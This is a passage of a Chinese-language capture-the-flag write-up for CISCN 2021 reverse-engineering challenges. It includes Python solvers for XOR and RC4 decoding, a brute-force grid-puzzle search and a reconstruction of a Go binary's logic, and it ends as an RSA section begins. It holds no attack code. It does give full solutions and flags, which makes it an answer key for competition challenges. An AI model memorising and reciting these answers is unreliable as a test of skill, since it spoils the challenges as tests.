class="hljs-number">0x98</span>,<span class="hljs-number">0x3f</span>]<br>s = <span class="hljs-string">&#x27;12345678&#x27;</span><br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(a)):<br>    a[i] ^= ord(s[i<span class="hljs-subst">%8</span>])<br>print(a)<br>aa = a<br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(aa), <span class="hljs-number">3</span>):<br>    a2 = aa[i+<span class="hljs-number">1</span>]^aa[i]<br>    a3 = a2^aa[i+<span class="hljs-number">2</span>]<br>    a1 = aa[i]^a3<br>    aa[i] = a1<br>    aa[i+<span class="hljs-number">1</span>] = a2<br>    aa[i+<span class="hljs-number">2</span>] = a3<br>result = <span class="hljs-string">&quot;&quot;</span><br>for i <span class="hljs-keyword">in</span> aa:<br>    result += hex(i)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>print(result)<br></code></pre></td></tr></table></figure><p>最后rc4解密。</p><p><img src="/2021/05/30/CISCN-2021-wp/image-20210515130345747.png" alt="image-20210515130345747"></p><p>得到flag：CISCN{6654d84617f627c88846c172e0f4d46c}</p><h1 id="BABY-bc"><a href="#BABY-bc" class="headerlink" title="BABY_bc"></a>BABY_bc</h1><p>LLVM 恢复程序。</p><p><img src="/2021/05/30/CISCN-2021-wp/image-20210515201706133.png" alt="image-20210515201706133"></p><p><img src="/2021/05/30/CISCN-2021-wp/image-20210515201439526.png" alt="image-20210515201439526"></p><p>fill_number,校验两个为0的位数。</p><p>docheck 校验行和列，，没看公告，，跑出来两个结果，，，麻了。<br><img src="/2021/05/30/CISCN-2021-wp/image-20210515205922568.png" alt="image-20210515205922568"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s</span> =<span class="hljs-meta"> []</span><br><span class="hljs-attribute">for</span> i<span class="hljs-number">1</span> in range(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>):<br>    <span class="hljs-attribute">if</span> i<span class="hljs-number">1</span> == <span class="hljs-number">3</span>:<br>        <span class="hljs-attribute">continue</span><br>    <span class="hljs-attribute">for</span> i<span class="hljs-number">2</span> in range(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>):<br>        <span class="hljs-attribute">if</span> i<span class="hljs-number">2</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">continue</span><br>        <span class="hljs-attribute">for</span> i<span class="hljs-number">3</span> in range(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>):<br>            <span class="hljs-attribute">if</span> i<span class="hljs-number">3</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">3</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">3</span> == <span class="hljs-number">4</span>:<br>                <span class="hljs-attribute">continue</span><br>            <span class="hljs-attribute">for</span> i<span class="hljs-number">4</span> in range(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>):<br>                <span class="hljs-attribute">if</span> i<span class="hljs-number">4</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">4</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">4</span> == i<span class="hljs-number">3</span> or i<span class="hljs-number">4</span> == <span class="hljs-number">0</span> or i<span class="hljs-number">4</span> == <span class="hljs-number">3</span>:<br>                    <span class="hljs-attribute">continue</span><br>                <span class="hljs-attribute">for</span> i<span class="hljs-number">5</span> in range(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>):<br>                    <span class="hljs-attribute">if</span> i<span class="hljs-number">5</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">5</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">5</span> == i<span class="hljs-number">3</span> or i<span class="hljs-number">5</span> ==i<span class="hljs-number">4</span> or i<span class="hljs-number">4</span> &lt;= i<span class="hljs-number">5</span> or i<span class="hljs-number">5</span> == <span class="hljs-number">0</span>:<br>                        <span class="hljs-attribute">continue</span><br>                    <span class="hljs-attribute">else</span>:<br>                        <span class="hljs-attribute">a</span> =<span class="hljs-meta"> []</span><br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">1</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">2</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">3</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">4</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">5</span>)<br>                        <span class="hljs-attribute">s</span>.append(a)<br><span class="hljs-attribute">print</span>(s)<br><span class="hljs-attribute">print</span>(len(s))<br><span class="hljs-attribute">ss</span> =<span class="hljs-meta"> []</span><br><span class="hljs-attribute">for</span> i<span class="hljs-number">1</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>    <span class="hljs-attribute">for</span> i<span class="hljs-number">2</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>        <span class="hljs-attribute">if</span> i<span class="hljs-number">2</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">2</span> &gt;= i<span class="hljs-number">1</span> or i<span class="hljs-number">2</span> == <span class="hljs-number">5</span>:<br>            <span class="hljs-attribute">continue</span><br>        <span class="hljs-attribute">for</span> i<span class="hljs-number">3</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>            <span class="hljs-attribute">if</span> i<span class="hljs-number">3</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">3</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">3</span> == <span class="hljs-number">4</span>:<br>                <span class="hljs-attribute">continue</span><br>            <span class="hljs-attribute">for</span> i<span class="hljs-number">4</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>                <span class="hljs-attribute">if</span> i<span class="hljs-number">4</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">4</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">4</span> == i<span class="hljs-number">3</span> or i<span class="hljs-number">4</span> == <span class="hljs-number">3</span>:<br>                    <span class="hljs-attribute">continue</span><br>                <span class="hljs-attribute">for</span> i<span class="hljs-number">5</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>                    <span class="hljs-attribute">if</span> i<span class="hljs-number">5</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">5</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">5</span> == i<span class="hljs-number">3</span> or i<span class="hljs-number">5</span> ==i<span class="hljs-number">4</span>:<br>                        <span class="hljs-attribute">continue</span><br>                    <span class="hljs-attribute">else</span>:<br>                        <span class="hljs-attribute">a</span> =<span class="hljs-meta"> []</span><br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">1</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">2</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">3</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">4</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">5</span>)<br>                        <span class="hljs-attribute">ss</span>.append(a)<br><span class="hljs-attribute">print</span>(ss)<br><span class="hljs-attribute">print</span>(len(ss))<br><span class="hljs-attribute">sss</span> =<span class="hljs-meta"> []</span><br><span class="hljs-attribute">for</span> i<span class="hljs-number">1</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>    <span class="hljs-attribute">for</span> i<span class="hljs-number">2</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>        <span class="hljs-attribute">if</span> i<span class="hljs-number">2</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">1</span> &gt;= i<span class="hljs-number">2</span>:<br>            <span class="hljs-attribute">continue</span><br>        <span class="hljs-attribute">for</span> i<span class="hljs-number">3</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>            <span class="hljs-attribute">if</span> i<span class="hljs-number">3</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">3</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">3</span> != <span class="hljs-number">4</span>:<br>                <span class="hljs-attribute">continue</span><br>            <span class="hljs-attribute">for</span> i<span class="hljs-number">4</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>                <span class="hljs-attribute">if</span> i<span class="hljs-number">4</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">4</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">4</span> == i<span class="hljs-number">3</span> or i<span class="hljs-number">4</span> &gt;= <span class="hljs-number">3</span> or i<span class="hljs-number">4</span> == <span class="hljs-number">3</span>:<br>                    <span class="hljs-attribute">continue</span><br>                <span class="hljs-attribute">for</span> i<span class="hljs-number">5</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>                    <span class="hljs-attribute">if</span> i<span class="hljs-number">5</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">5</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">5</span> == i<span class="hljs-number">3</span> or i<span class="hljs-number">5</span> ==i<span class="hljs-number">4</span> or i<span class="hljs-number">5</span> &gt;= i<span class="hljs-number">4</span>:<br>                        <span class="hljs-attribute">continue</span><br>                    <span class="hljs-attribute">else</span>:<br>                        <span class="hljs-attribute">a</span> =<span class="hljs-meta"> []</span><br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">1</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">2</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">3</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">4</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">5</span>)<br>                        <span class="hljs-attribute">sss</span>.append(a)<br><span class="hljs-attribute">print</span>(sss)<br><span class="hljs-attribute">print</span>(len(sss))<br><span class="hljs-attribute">ssss</span> =<span class="hljs-meta"> []</span><br><span class="hljs-attribute">for</span> i<span class="hljs-number">1</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>    <span class="hljs-attribute">for</span> i<span class="hljs-number">2</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>        <span class="hljs-attribute">if</span> i<span class="hljs-number">2</span> == i<span class="hljs-number">1</span>:<br>            <span class="hljs-attribute">continue</span><br>        <span class="hljs-attribute">for</span> i<span class="hljs-number">3</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>            <span class="hljs-attribute">if</span> i<span class="hljs-number">3</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">3</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">3</span> == <span class="hljs-number">4</span>:<br>                <span class="hljs-attribute">continue</span><br>            <span class="hljs-attribute">for</span> i<span class="hljs-number">4</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>                <span class="hljs-attribute">if</span> i<span class="hljs-number">4</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">4</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">4</span> == i<span class="hljs-number">3</span> or i<span class="hljs-number">4</span> != <span class="hljs-number">3</span> or i<span class="hljs-number">4</span> == <span class="hljs-number">2</span>:<br>                    <span class="hljs-attribute">continue</span><br>                <span class="hljs-attribute">for</span> i<span class="hljs-number">5</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>                    <span class="hljs-attribute">if</span> i<span class="hljs-number">5</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">5</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">5</span> == i<span class="hljs-number">3</span> or i<span class="hljs-number">5</span> ==i<span class="hljs-number">4</span>:<br>                        <span class="hljs-attribute">continue</span><br>                    <span class="hljs-attribute">else</span>:<br>                        <span class="hljs-attribute">a</span> =<span class="hljs-meta"> []</span><br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">1</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">2</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">3</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">4</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">5</span>)<br>                        <span class="hljs-attribute">ssss</span>.append(a)<br><span class="hljs-attribute">print</span>(ssss)<br><span class="hljs-attribute">print</span>(len(ssss))<br><span class="hljs-attribute">sssss</span> =<span class="hljs-meta"> []</span><br><span class="hljs-attribute">for</span> i<span class="hljs-number">1</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>    <span class="hljs-attribute">for</span> i<span class="hljs-number">2</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>        <span class="hljs-attribute">if</span> i<span class="hljs-number">2</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">2</span> &gt;= i<span class="hljs-number">1</span>:<br>            <span class="hljs-attribute">continue</span><br>        <span class="hljs-attribute">for</span> i<span class="hljs-number">3</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>            <span class="hljs-attribute">if</span> i<span class="hljs-number">3</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">3</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">3</span> == <span class="hljs-number">4</span>:<br>                <span class="hljs-attribute">continue</span><br>            <span class="hljs-attribute">for</span> i<span class="hljs-number">4</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>                <span class="hljs-attribute">if</span> i<span class="hljs-number">4</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">4</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">4</span> == i<span class="hljs-number">3</span> or i<span class="hljs-number">3</span> &lt;= i<span class="hljs-number">4</span> or i<span class="hljs-number">4</span> == <span class="hljs-number">3</span>:<br>                    <span class="hljs-attribute">continue</span><br>                <span class="hljs-attribute">for</span> i<span class="hljs-number">5</span> in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>                    <span class="hljs-attribute">if</span> i<span class="hljs-number">5</span> == i<span class="hljs-number">1</span> or i<span class="hljs-number">5</span> == i<span class="hljs-number">2</span> or i<span class="hljs-number">5</span> == i<span class="hljs-number">3</span> or i<span class="hljs-number">5</span> ==i<span class="hljs-number">4</span> or i<span class="hljs-number">5</span> == <span class="hljs-number">1</span>:<br>                        <span class="hljs-attribute">continue</span><br>                    <span class="hljs-attribute">else</span>:<br>                        <span class="hljs-attribute">a</span> =<span class="hljs-meta"> []</span><br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">1</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">2</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">3</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">4</span>)<br>                        <span class="hljs-attribute">a</span>.append(i<span class="hljs-number">5</span>)<br>                        <span class="hljs-attribute">sssss</span>.append(a)<br><span class="hljs-attribute">print</span>(sssss)<br><span class="hljs-attribute">print</span>(len(sssss))<br><span class="hljs-attribute">count</span> = <span class="hljs-number">0</span><br><span class="hljs-attribute">for</span> i<span class="hljs-number">1</span> in s:<br>    <span class="hljs-attribute">for</span> i<span class="hljs-number">2</span> in ss:<br>        <span class="hljs-attribute">if</span> i<span class="hljs-number">1</span>[<span class="hljs-number">2</span>] &lt;= i<span class="hljs-number">2</span>[<span class="hljs-number">2</span>] or i<span class="hljs-number">1</span>[<span class="hljs-number">4</span>] &lt;= i<span class="hljs-number">2</span>[<span class="hljs-number">4</span>]:<br>            <span class="hljs-attribute">continue</span><br>        <span class="hljs-attribute">c</span> = <span class="hljs-number">0</span><br>        <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">5</span>):<br>            <span class="hljs-attribute">if</span> i<span class="hljs-number">2</span>[i] == i<span class="hljs-number">1</span>[i]:<br>                <span class="hljs-attribute">c</span> = <span class="hljs-number">1</span><br>        <span class="hljs-attribute">if</span> c == <span class="hljs-number">1</span>:<br>            <span class="hljs-attribute">continue</span><br>        <span class="hljs-attribute">for</span> i<span class="hljs-number">3</span> in sss:<br>            <span class="hljs-attribute">c</span> = <span class="hljs-number">0</span><br>            <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">5</span>):<br>                <span class="hljs-attribute">if</span> i<span class="hljs-number">3</span>[i] == i<span class="hljs-number">1</span>[i] or i<span class="hljs-number">3</span>[i] == i<span class="hljs-number">2</span>[i]:<br>                    <span class="hljs-attribute">c</span> = <span class="hljs-number">1</span><br>            <span class="hljs-attribute">if</span> c == <span class="hljs-number">1</span>:<br>                <span class="hljs-attribute">continue</span><br>            <span class="hljs-attribute">for</span> i<span class="hljs-number">4</span> in ssss:<br>                <span class="hljs-attribute">c</span> = <span class="hljs-number">0</span><br>                <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">5</span>):<br>                    <span class="hljs-attribute">if</span> i<span class="hljs-number">4</span>[i] == i<span class="hljs-number">1</span>[i] or i<span class="hljs-number">4</span>[i] == i<span class="hljs-number">2</span>[i] or i<span class="hljs-number">4</span>[i] == i<span class="hljs-number">3</span>[i]:<br>                        <span class="hljs-attribute">c</span> = <span class="hljs-number">1</span><br>                <span class="hljs-attribute">if</span> c == <span class="hljs-number">1</span>:<br>                    <span class="hljs-attribute">continue</span><br>                <span class="hljs-attribute">for</span> i<span class="hljs-number">5</span> in sssss:<br>                    <span class="hljs-attribute">if</span> i<span class="hljs-number">4</span>[<span class="hljs-number">1</span>] &gt;= i<span class="hljs-number">5</span>[<span class="hljs-number">1</span>] or i<span class="hljs-number">4</span>[<span class="hljs-number">4</span>] &gt;= i<span class="hljs-number">5</span>[<span class="hljs-number">4</span>]:<br>                        <span class="hljs-attribute">continue</span><br>                    <span class="hljs-attribute">c</span> = <span class="hljs-number">0</span><br>                    <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">5</span>):<br>                        <span class="hljs-attribute">if</span> i<span class="hljs-number">5</span>[i] == i<span class="hljs-number">1</span>[i] or i<span class="hljs-number">5</span>[i] == i<span class="hljs-number">2</span>[i] or i<span class="hljs-number">5</span>[i] == i<span class="hljs-number">3</span>[i] or i<span class="hljs-number">5</span>[i] == i<span class="hljs-number">4</span>[i]:<br>                            <span class="hljs-attribute">c</span> = <span class="hljs-number">1</span><br>                    <span class="hljs-attribute">if</span> c == <span class="hljs-number">1</span>:<br>                        <span class="hljs-attribute">continue</span><br>                    <span class="hljs-attribute">count</span> += <span class="hljs-number">1</span><br>                    <span class="hljs-attribute">print</span>(&#x27;-----------------&#x27;)<br>                    <span class="hljs-attribute">print</span>(i<span class="hljs-number">1</span>)<br>                    <span class="hljs-attribute">print</span>(i<span class="hljs-number">2</span>)<br>                    <span class="hljs-attribute">print</span>(i<span class="hljs-number">3</span>)<br>                    <span class="hljs-attribute">print</span>(i<span class="hljs-number">4</span>)<br>                    <span class="hljs-attribute">print</span>(i<span class="hljs-number">5</span>)<br><span class="hljs-attribute">print</span>(count)<br></code></pre></td></tr></table></figure><p><img src="/2021/05/30/CISCN-2021-wp/image-20210515201556206.png" alt="image-20210515201556206"></p><p><img src="/2021/05/30/CISCN-2021-wp/image-20210515201602525.png" alt="image-20210515201602525"></p><p><img src="/2021/05/30/CISCN-2021-wp/image-20210515201614530.png" alt="image-20210515201614530"></p><h1 id="GIFT"><a href="#GIFT" class="headerlink" title="GIFT"></a>GIFT</h1><p>比赛时没做出来，参考大佬博客学习一下。</p><p>不用费劲恢复符号表了，使用IDA7.6即可，哭了。</p><p>关键代码：</p><p><img src="/2021/05/30/CISCN-2021-wp/image-20210525184017527.png" alt="image-20210525184017527"></p><p>怎么判断V8呢？</p><p><img src="/2021/05/30/CISCN-2021-wp/image-20210525184205756.png" alt="image-20210525184205756"></p><p>对应的汇编：</p><p><img src="/2021/05/30/CISCN-2021-wp/image-20210525184500650.png" alt="image-20210525184500650"></p><p>进入main_goooo分析：</p><p><img src="/2021/05/30/CISCN-2021-wp/image-20210525184533241.png" alt="image-20210525184533241"></p><p>发现 返回时有两种情况，arg_18处给0或者1，当上边两个值为0时，会返回1。也就是v8为1。</p><p>这个地方分析是， （cs:qword_2820E8+1）% 17</p><p><img src="/2021/05/30/CISCN-2021-wp/image-20210525184053283.png" alt="image-20210525184053283"></p><p>python还原关键代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tab1</span> =<span class="hljs-meta"> [0x0000000000000001, 0x0000000000000003, 0x0000000000000006, 0x0000000000000009, 0x000000000000000A, 0x000000000000000B, 0x000000000000000C, 0x000000000000000D, 0x000000000000000E, 0x000000000000000F, 0x0000000000000010, 0x0000000000000011, 0x0000000000000012, 0x0000000000000014, 0x0000000000000019, 0x000000000000001E, 0x0000000000000028, 0x0000000000000042, 0x0000000000000066, 0x00000000000000A0, 0x0000000000000936, 0x0000000000003D21, 0x00000000000149A7, 0x00000000000243AC, 0x00000000000CB5BE, 0x000000000047DC61, 0x00000000016C0F46, 0x000000000262C432, 0x0000000004ACE299, 0x0000000010FBC92A, 0x00000000329ECDFD, 0x00000000370D7470]</span><br><br><span class="hljs-attribute">def</span> main_goooo(data):<br>    <span class="hljs-attribute">v4</span> =<span class="hljs-meta"> [0] * 5</span><br><span class="hljs-meta">    for i in range(len(data)):</span><br><span class="hljs-meta">        v3 = data[i]</span><br>        <span class="hljs-attribute">v4</span>[v<span class="hljs-number">3</span>] ^= <span class="hljs-number">1</span><br>    <span class="hljs-attribute">return</span> v<span class="hljs-number">4</span>[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span> and v<span class="hljs-number">4</span>[<span class="hljs-number">3</span>] == <span class="hljs-number">0</span><br><br><span class="hljs-attribute">def</span> main_wtf(a<span class="hljs-number">1</span>, a<span class="hljs-number">2</span>, a<span class="hljs-number">3</span>, a<span class="hljs-number">4</span>):<br>    <span class="hljs-attribute">global</span> num<br>    <span class="hljs-attribute">a3</span>[a<span class="hljs-number">1</span>] = a<span class="hljs-number">2</span><br>    <span class="hljs-attribute">if</span> a<span class="hljs-number">1</span> == a<span class="hljs-number">4</span> - <span class="hljs-number">1</span>:<br>        <span class="hljs-attribute">if</span> main_goooo(a<span class="hljs-number">3</span>):<br>            <span class="hljs-attribute">num</span> = (num + <span class="hljs-number">1</span>) % <span class="hljs-number">17</span><br>    <span class="hljs-attribute">else</span>:<br>        <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>):<br>            <span class="hljs-attribute">main_wtf</span>(a<span class="hljs-number">1</span>+<span class="hljs-number">1</span>, i, a<span class="hljs-number">3</span>, a<span class="hljs-number">4</span>)<br><span class="hljs-attribute">def</span> main(N):<br>    <span class="hljs-attribute">global</span> num<br>    <span class="hljs-attribute">num</span> = <span class="hljs-number">0</span><br>    <span class="hljs-attribute">data</span> =<span class="hljs-meta"> [0] * N</span><br><span class="hljs-meta">    for i in range(1, 5):</span><br><span class="hljs-meta">        main_wtf(0, i, data, N)</span><br><span class="hljs-meta">    print(num)</span><br><span class="hljs-meta"># 从1开始跑</span><br><span class="hljs-meta">#flag_i = [main(i) for i in range(1, 16)]</span><br><br><span class="hljs-comment"># 1 2 3 4 5 6 7  8</span><br><span class="hljs-comment"># 2 6 3 4 0 2 12 5 2 6 3 4 0</span><br><span class="hljs-comment"># 发现8个一组</span><br><span class="hljs-attribute">ss</span> =<span class="hljs-meta"> [2, 6, 3, 4, 0, 2, 12, 5]</span><br><span class="hljs-attribute">ss_result</span> =<span class="hljs-meta"> []</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>x<span class="hljs-number">20</span>):<br>    <span class="hljs-attribute">idx</span> = tab<span class="hljs-number">1</span>[i]<br>    <span class="hljs-attribute">ss_result</span>.append(ss[((idx-<span class="hljs-number">1</span>) % <span class="hljs-number">8</span>)])<br><span class="hljs-attribute">print</span>(ss_result)<br><span class="hljs-attribute">s1</span> =<span class="hljs-meta"> [0x54, 0x5e, 0x52, 0x04, 0x55, 0x05, 0x53, 0x5f, 0x50, 0x07, 0x54, 0x56, 0x51, 0x02, 0x03, 0x57]</span><br><span class="hljs-attribute">result2</span> = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>x<span class="hljs-number">20</span>):<br>    <span class="hljs-attribute">result2</span> += chr(s<span class="hljs-number">1</span>[ss_result[i]] ^ <span class="hljs-number">0</span>x<span class="hljs-number">66</span>)<br><span class="hljs-attribute">print</span>(result<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>大佬们都发现了运算规律，我属实脑子不够用，但是发现了8个为一组的规律。</p><p>CISCN{4b445b3247c45344c54c44734445452c}</p><h1 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h1><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 